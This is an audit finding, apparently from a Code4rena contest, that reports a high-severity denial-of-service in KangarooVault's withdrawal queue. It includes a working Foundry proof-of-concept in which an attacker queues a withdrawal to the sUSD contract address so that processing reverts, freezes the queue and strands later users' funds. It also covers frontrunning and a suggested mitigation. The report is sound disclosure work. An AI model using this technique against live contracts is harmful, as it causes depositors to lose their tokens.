[H-11] KangarooVaultQueuedWithdrawDenial of Service
Submitted byLirios
When theKangarooVaulthas an open position, any withdrawals that are initiated, are queued.
QueuedWithdrawalswork in two steps.
A user initialtes the Withdrawal viainitiateWithdrawal(KangarooVault.sol#L215). This burns theVaultTokenandif (positionData.positionId != 0)(KangarooVault.sol#L225) adds the request to thewithdrawalQueue.processWithdrawalQueue()can be called to process requests in thewithdrawalQueuethat have passedminWithdrawDelayto transfer the SUSD tokens to the user.
If the processing of aQueuedWithdrawentry in thewithdrawalQueuereverts, thequeuedWithdrawalHead(KangarooVault.sol#L331) will never increase and further processing of the queue will be impossible.
This means that any users that have placed a QueuedWithdraw after the reverting entry will have lost their vaultToken without receiving their SUSD.
Proof of Concept
When calling theinitiateWithdrawal()function, the user can provide an address of the receiver of funds.
When processing the withdrawal queue, the contracts does all the required checks, and then transfers the SUSD (KangarooVault.sol#L322) to the provided user.
If we look at theSynthetix sUSD tokenand itâ€™starget implementationwe will find that the SUSD token transfer code is:
sUSD MultiCollateralSynth:L723-L739
function_internalTransfer(addressfrom,addressto,uintvalue)internalreturns(bool) {/* Disallow transfers to irretrievable-addresses. */require(to!=address(0) &&to!=address(this) &&to!=address(proxy),"Cannot transfer to this address");// Insufficient balance will be handled by the safe subtraction.tokenState.setBalanceOf(from,tokenState.balanceOf(from).sub(value));tokenState.setBalanceOf(to,tokenState.balanceOf(to).add(value));// Emit a standard ERC20 transfer eventemitTransfer(from,to,value);returntrue;}
This means any SUSD transfer to the SUSD proxy or implementation contract, will result in a revert.
An attacker can use this to make ainitiateWithdrawal()request withuser=sUSDproxyoruser=sUSD_MultiCollateralSynth. Any user that request a Withdrawal viainitiateWithdrawal()after this, will lose their vault tokens without receiving their SUSD.
The attacker can do this at any time, or by frontrunning a specific (large)initiateWithdrawal()request.
To test it, a check is added to the mock contract that is used for SUSD in the test scripts:
diff --git a/src/test-helpers/MockERC20Fail.sol b/src/test-helpers/MockERC20Fail.solindex e987f04..1ce10ec 100644--- a/src/test-helpers/MockERC20Fail.sol+++ b/src/test-helpers/MockERC20Fail.sol@@ -18,6 +18,9 @@ contract MockERC20Fail is MockERC20 {}function transfer(address receiver, uint256 amount) public override returns (bool) {++        require(receiver != address(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB) , "Cannot transfer to this address");+if (forceFail) {return false;}
In theKangarooVault.t.soltest script, the following test was added to demonstrated the issue:
// add to top of file:import{IVaultToken}from"../../src/interfaces/IVaultToken.sol";// add to KangarooTest Contract:functiontestWithdrawalDOS()public{IVaultTokenvault_token=kangaroo.VAULT_TOKEN();// make deposit for user_2susd.mint(user_2,2e23);vm.startPrank(user_2);susd.approve(address(kangaroo),2e23);kangaroo.initiateDeposit(user_2,2e23);assertEq(vault_token.balanceOf(user_2),2e23);vm.stopPrank();// have vault open a position to force queued wthdrawalstestOpen();// vault has  position opened, withdrawal will be queued, vault_token burned, no USDC receivedvm.startPrank(user_2);kangaroo.initiateWithdrawal(user_2,1e23);assertEq(susd.balanceOf(user_2),0);assertEq(vault_token.balanceOf(user_2),1e23);// process withdrawalqueue, withdrawam should passskip(kangaroo.minWithdrawDelay());kangaroo.processWithdrawalQueue(3);uint256user_2_balance=susd.balanceOf(user_2);assertGt(user_2_balance,0);vm.stopPrank();// user 3 frontruns with fake/reverting withdrawal request.// to 0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB (= SUSD MultiCollateralSynth contract address).// This will cause SUSD transfer to revert.vm.startPrank(user_3);kangaroo.initiateWithdrawal(0xDfA2d3a0d32F870D87f8A0d7AA6b9CdEB7bc5AdB,0);vm.stopPrank();// user_2 adds another withdrawal request, after the attackers request, vault_token burned, no USDC receivedvm.startPrank(user_2);kangaroo.initiateWithdrawal(user_2,1e23);assertEq(vault_token.balanceOf(user_2),0);// processWithdrawalQueue now reverts and no funds receivedskip(kangaroo.minWithdrawDelay());vm.expectRevert(bytes("TRANSFER_FAILED"));kangaroo.processWithdrawalQueue(3);assertEq(susd.balanceOf(user_2),user_2_balance);assertEq(vault_token.balanceOf(user_2),0);vm.stopPrank();}
Tools Used
Manual review, forge
Recommended Mitigation Steps
The processing ofwithdrawalQueueshould have a mechanism to handle revertingQueuedWithdrawentries.
Either by skipping them and/or moving them to anotherfailedWithdrawalsqueue.
Dravee (judge) commented:
Similar but different fromhttps://github.com/code-423n4/2023-03-polynomial-findings/issues/103Somehow the import should beimport {IVaultToken} from "../src/interfaces/IVaultToken.sol";(one step less), but the POC runs correctly after that.
mubaris (Polynomial) confirmed